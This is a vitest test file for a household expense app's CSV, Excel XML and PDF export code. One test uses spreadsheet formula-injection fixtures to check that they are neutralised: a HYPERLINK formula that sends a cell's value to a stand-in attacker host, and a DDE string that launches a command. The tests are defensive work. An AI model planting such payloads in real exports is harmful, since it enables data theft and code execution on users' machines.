import { describe, expect, it } from "vitest";
import { transactionsToCsv, transactionsToExcelXml, transactionsToPdf } from "./export";
import { parseExpenseCsv } from "./import-csv";
import type { Transaction } from "./types";

const sample = {
  id: "1",
  household_id: "h",
  member_id: null,
  created_by: null,
  name: "Nandini Milk",
  amount: 54,
  occurred_on: "2026-09-22",
  category_id: null,
  subcategory_id: null,
  merchant_id: null,
  payment_method_id: null,
  purchase_channel: null,
  notes: null,
  needs_review: false,
  categorization_source: "rule",
  categorization_confidence: 0.9,
  client_request_id: null,
  created_at: "",
  updated_at: "",
  category: { id: "g", household_id: null, name: "Groceries", group_name: "Food", color: "", sort_order: 1, is_system: true },
} as Transaction;

function dataLine(csv: string): string {
  return csv.replace(/^﻿/, "").split("\n")[1];
}

describe("export", () => {
  it("includes rupee amounts and names in CSV", () => {
    const csv = transactionsToCsv([sample]);
    expect(csv).toContain("Nandini Milk");
    expect(csv).toContain("54.00");
    expect(csv).toContain("Groceries");
  });

  it("neutralises formula-looking text cells", () => {
    const csv = transactionsToCsv([
      { ...sample, name: '=HYPERLINK("https://evil.example?a="&C2,"click")', notes: "@SUM(1)" },
    ]);
    const line = dataLine(csv);
    expect(line.startsWith(`2026-09-22,"'=HYPERLINK(""https://evil.example?a=""&C2,""click"")",54.00,`)).toBe(true);
    expect(line.endsWith(",'@SUM(1)")).toBe(true);
    for (const lead of ["+", "-", "\t", "\r"]) {
      const out = dataLine(transactionsToCsv([{ ...sample, name: `${lead}cmd|' /C calc'!A0` }]));
      expect(out.split(",")[1].replace(/^"/, "").startsWith(`'${lead}`)).toBe(true);
    }
  });

  it("keeps amounts numeric, including plain negative numbers", () => {
    const line = dataLine(transactionsToCsv([{ ...sample, amount: -120.5, notes: "-40" }]));
    expect(line.split(",")[2]).toBe("-120.50");
    expect(line.endsWith(",-40")).toBe(true);
  });

  it("quotes commas, quotes and line breaks", () => {
    const line = transactionsToCsv([{ ...sample, name: 'Milk, "full cream"', notes: "line one\r\nline two" }]);
    expect(line).toContain('"Milk, ""full cream"""');
    expect(line).toContain('"line one\r\nline two"');
  });

  it("round-trips through the CSV importer", () => {
    const csv = transactionsToCsv([
      { ...sample, name: "=1+1", notes: 'Bought "two"\nfor the party, again' },
      { ...sample, name: "Bread", amount: 40 },
    ]);
    const { rows, skipped } = parseExpenseCsv(csv);
    expect(skipped).toBe(0);
    expect(rows).toHaveLength(2);
    expect(rows[0]).toMatchObject({ name: "=1+1", amount: 54, notes: 'Bought "two"\nfor the party, again' });
    expect(rows[1]).toMatchObject({ name: "Bread", amount: 40, categoryName: "Groceries" });
  });

  it("writes Excel amounts as numbers and text as escaped strings", () => {
    const out = transactionsToExcelXml([{ ...sample, name: "Tea & <biscuits>\u0007", amount: 54.5 }]);
    expect(out).toContain('<Cell><Data ss:Type="Number">54.5</Data></Cell>');
    expect(out).toContain('<Cell><Data ss:Type="String">Tea &amp; &lt;biscuits&gt;</Data></Cell>');
    expect(out).toContain('<Cell><Data ss:Type="String">Amount</Data></Cell>');
    expect(out).not.toContain("\u0007");
  });

  it("writes the PDF in WinAnsi text with Rs. instead of the rupee sign", () => {
    const rows = [
      { ...sample, name: "Café “special” दूध", amount: 1234.5 },
      ...Array.from({ length: 41 }, (_, i) => ({ ...sample, id: String(i + 2) })),
    ];
    const bytes = transactionsToPdf(rows, "HomeLedger October 2026");
    const pdf = String.fromCharCode(...bytes);
    expect(pdf).toContain("/Encoding /WinAnsiEncoding");
    expect(pdf).toContain("(Total: Rs. 3,448.5) Tj");
    expect(pdf).toContain(`(2026-09-22  Café "special" ???  Rs. 1,234.5) Tj`);
    expect(pdf).toContain("(...and 2 more) Tj");
    expect(pdf).not.toMatch(/[^\x00-\xff]/);
    // The byte offsets in the xref table still land on each object.
    const offsets = [...pdf.matchAll(/^(\d{10}) 00000 n $/gm)].map((m) => Number(m[1]));
    expect(offsets).toHaveLength(5);
    offsets.forEach((at, i) => expect(pdf.slice(at, at + 8)).toBe(`${i + 1} 0 obj `));
    const xrefAt = Number(/startxref\n(\d+)/.exec(pdf)?.[1]);
    expect(pdf.slice(xrefAt, xrefAt + 4)).toBe("xref");
  });
});
